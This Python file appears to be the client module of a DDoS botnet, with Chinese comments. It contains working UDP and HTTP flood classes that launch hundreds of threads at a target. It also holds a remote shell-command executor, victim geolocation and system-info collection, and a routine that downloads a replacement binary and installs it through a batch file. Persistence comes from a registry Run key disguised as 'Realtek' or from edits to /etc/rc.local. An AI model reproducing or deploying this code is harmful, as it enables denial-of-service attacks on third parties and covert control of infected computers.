# encoding=utf-8


import os
import sys
import json
import time
import socket
import random
import platform
import requests
import threading
import subprocess
import urllib.request

# udp1 var
UDP1_THREADS = 100
UDP1_INTERVAL = 0.3
UDP1_PACKET_SIZE = 100

# udp2 var
UDP2_THREADS = 200

# cc1 var
CC1_THREADS = 100
CC1_INTERVAL = 0.5

# cc2 var
CC2_THREADS = 200


class UDPFloodAttack(threading.Thread):
    def __init__(self, ip, port, packet_size, duration, interval):
        # ip 为目标 IP
        # port 为目标端口
        # package_size 为发送数据包字节大小
        # duration 为持续秒数
        # interval 为间隔发包秒数

        threading.Thread.__init__(self)

        self.ip = ip
        self.port = int(port)
        self.packet_size = int(packet_size)
        self.duration = int(duration)
        self.interval = float(interval)
        self.udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.packet = random._urandom(self.packet_size)  # 随机内容填充
        self.current_time = int(time.time())  # 获取当前执行秒数
        # print(self.packet)
        # print(self.ip, self.port, self.packet_size, self.duration, self.interval, self.current_time, int(time.time()))

    def run(self):
        while self.duration > (int(time.time()) - self.current_time):  # 持续 duration 秒
            try:
                self.udp.sendto(self.packet, (self.ip, self.port,))
                time.sleep(self.interval)
            except Exception as err:
                pass


def udp1(ip, port, duration):
    print('ip->', ip, 'port->', port, 'duration->', duration)
    for thread in range(UDP1_THREADS):  # thread num
        thread = UDPFloodAttack(ip=ip,
                                port=port,
                                packet_size=UDP1_PACKET_SIZE,
                                duration=duration,
                                interval=UDP1_INTERVAL,
                                )
        thread.start()


def udp2(ip, port, duration, packet_size, interval):
    print('ip->', ip, 'port->', port, 'duration->', duration,
          'packet_size->', packet_size, 'interval->', interval)

    for thread in range(UDP2_THREADS):  # thread num
        thread = UDPFloodAttack(ip=ip,
                                port=port,
                                packet_size=packet_size,
                                duration=duration,
                                interval=interval,
                                )
        thread.start()


class CCAttacker(threading.Thread):
    def __init__(self, url, duration, interval):
        threading.Thread.__init__(self)

        self.url = url  # 目标地址
        self.duration = int(duration)  # 持续秒数
        self.interval = float(interval)  # 间隔秒数
        self.current_time = int(time.time())  # 获取当前执行秒数

    def run(self):
        while self.duration > (int(time.time()) - self.current_time):  # 持续 duration 秒
            try:
                response = requests.get(self.url)  # response.status, response.getcode()
                # print(response.status_code, len(response.text))
                time.sleep(self.interval)
            except Exception:
                pass


def cc1(url, duration):
    for thread in range(CC1_THREADS):
        thread = CCAttacker(url=url,
                            duration=duration,
                            interval=CC1_INTERVAL,
                            )
        thread.start()


def cc2(url, duration, interval):
    for thread in range(CC2_THREADS):
        thread = CCAttacker(url=url,
                            duration=duration,
                            interval=interval,
                            )
        thread.start()


def command_executor(cmd_queue=None, command=""):
    # result = "unknown err !"
    try:
        print('$$$\n', command, '\n$$$')

        if sys.platform[:3] == "win":
            result = subprocess.Popen(command.split(), shell=True,
                                      executable="C:\Windows\system32\cmd.exe",
                                      stdout=subprocess.PIPE,
                                      stderr=subprocess.PIPE).communicate()[0].decode('gbk')
            # executable="C:\Windows\system32\cmd.exe"
        elif sys.platform[:3] == "lin":
            result = subprocess.Popen(command.split(), shell=False,
                                      stdout=subprocess.PIPE,
                                      stderr=subprocess.PIPE).communicate()[0].decode('utf-8')
        else:
            pass

        print("###\n", result, "\n###")
        if cmd_queue:
            cmd_queue.put(result)
        else:
            return result
    except Exception as err:
        if cmd_queue:
            cmd_queue.put(err)
        else:
            return err


def geo_locate(geo_queue):
    # geo = "can not get geo !"
    try:
        response = json.loads(requests.get("http://freegeoip.net/json/").text)
        geo = (response['country_name'] + " -> " +
               response['region_name'] + " -> " +
               response['city'])

        geo_queue.put(geo)

    except Exception as err:
        geo_queue.put(err)

        # SSDP DDoS


def system_info(info_queue):
    # 获取系统基本信息
    # 指令格式为 .info NICK

    sysinfo = platform.uname()

    info_queue.put("OS: {0}\nPC Name: {1}\nVersion: {2}\nPlatform: {3}\nProcessor: {4}".format(
        sysinfo.system + " " + sysinfo.release,
        sysinfo.node,
        sysinfo.version,
        sysinfo.machine,
        sysinfo.processor
    )
    )


def file_upload(url, full_path):  # 文件上传
    # .upload win-xxx http://example.com/test.exe c:\windows\weird.exe

    try:
        print("get url ==> ", url)

        urllib.request.urlretrieve(url, full_path)

        if os.path.isfile(full_path):
            return True

    except Exception as err:
        pass

    return False


def self_update(url):  # 固定路径名 windows: awesome.exe linux: awesome

    try:
        print("get url ==> ", url)
        print("cur_path", os.path.realpath(__file__))  # recommand in C:\Windows\awesome.exe

        full_path = os.path.realpath(__file__)  # 当前程序的执行路径, 待利用.

        if sys.platform[:3] == "win":
            temp_dir = command_executor(command="echo %temp%").strip()  # %temp% C:\Users\xyz\AppData\Local\Temp
            local_dir = os.path.dirname(temp_dir)  # local_dir C:\Users\xyz\AppData\Local
            file_path = local_dir + "\\awesome.exe"     # 程序执行目录
            download_file_path = temp_dir + "\\awesome.exe"  # 把程序下载到此目录并命名文件
            bat_path = temp_dir + "\\reload.bat"  # bat生成到此目录

            urllib.request.urlretrieve(url, download_file_path)  # download bot

            reload_bat = r"""taskkill /F /im awesome*
                             copy NEW_FILE OLD_FILE /Y
                             start OLD_FILE /B
                             del /Q /F NEW_FILE
                             del /Q /F BAT_FILE
                        """  # 生成更新程序bat

            reload_bat = reload_bat.replace("NEW_FILE", download_file_path)
            reload_bat = reload_bat.replace("OLD_FILE", file_path)
            reload_bat = reload_bat.replace("BAT_FILE", bat_path)
            print("temp dir", temp_dir, "local_dir", local_dir, "file_path", file_path, "down_path", download_file_path, "bat_path", bat_path)
            print("reload_bat")
            print(reload_bat)
            open(bat_path, "a").write(reload_bat)  # write bat to C:\reload.bat
            print("bat wrote success !")

            command = "start /B {0}".format(bat_path)
            print(command)
            time.sleep(3)
            subprocess.Popen(command.split(), shell=True, executable="C:\Windows\system32\cmd.exe")

        elif sys.platform[:3] == "lin":
            pass
            # file_path = "/tmp/awesome"  # linux path
            # urllib.request.urlretrieve(url, file_path)
            #
            # sh_path = r"/tmp/reload"
            # reload_sh = r"""
            #                 kill -9 $(pidof "awesome")
            #                 cp -f /tmp/awesome /etc/awesome
            #                 /etc/awesome &
            #                 # rm /tmp/reload
            #                 # rm /tmp/awesome
            #              """
            # open(sh_path, "a").write(reload_sh)
            #
            # subprocess.Popen(r"sh /tmp/reload")
        else:
            pass

        # self_startup(file_path)     # 自更新完成后自动添加开机启动

        return True

    except Exception as err:

        return False

        # 接收完url中的程序后, 自动退出重启程序并修改开机自启动.


def self_startup(file_path=""):
    try:
        if not file_path:
            file_path = os.path.realpath(__file__)  # get file path and file name when execute

        if sys.platform[:3] == "win":

            command = """reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Realtek /t REG_SZ /d file_path /f"""
            # HKEY_CURRENT_USER 较 HKEY_LOCAL_MACHINE 有更好的兼容性
            command = command.replace("file_path", file_path)  # 路径 重复添加代表更改
            result = subprocess.Popen(command.split(), shell=False,
                                      stdout=subprocess.PIPE,
                                      stderr=subprocess.PIPE).communicate()[0].decode('gbk')

            return result

        elif sys.platform[:3] == "lin":
            del_command = """sed -i '/awesome/d' /etc/rc.local"""
            add_command = """sed -i 's/^exit 0/file_path\nexit 0/g' /etc/rc.local"""
            test_cmd = """sed -n 's/^exit 0/file_path\nexit 0/p' /etc/rc.local"""
            add_command = add_command.replace("file_path", file_path)
            test_cmd = test_cmd.replace("file_path", file_path)

            test_result = subprocess.Popen(test_cmd.split(), shell=False,
                                           stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE).communicate()[0].decode('utf-8')
            print("test_result")
            if test_result:
                del_cmd = subprocess.Popen(del_command.split(), shell=False,
                                           stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE).communicate()[0].decode('utf-8')
                result = subprocess.Popen(add_command.split(), shell=False,
                                          stdout=subprocess.PIPE,
                                          stderr=subprocess.PIPE).communicate()[0].decode('utf-8')
        else:
            pass
    except Exception as err:
        print(err)
